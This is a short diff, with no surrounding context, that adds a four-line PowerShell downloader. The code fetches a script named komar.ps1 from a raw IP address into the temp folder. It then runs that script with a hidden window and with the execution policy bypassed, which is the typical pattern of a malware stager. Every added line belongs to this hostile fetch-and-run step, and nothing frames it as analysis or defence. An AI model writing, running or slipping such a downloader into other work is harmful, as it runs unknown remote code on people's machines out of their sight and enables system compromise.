@@ -1,0 +1,4 @@
+$path = $Env:temp+'\komar.ps1'; 
+$client = New-Object System.Net.WebClient; 
+$client.downloadfile('http://45.32.229.66/komar.ps1',$path);
+C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -executionpolicy bypass -file $path
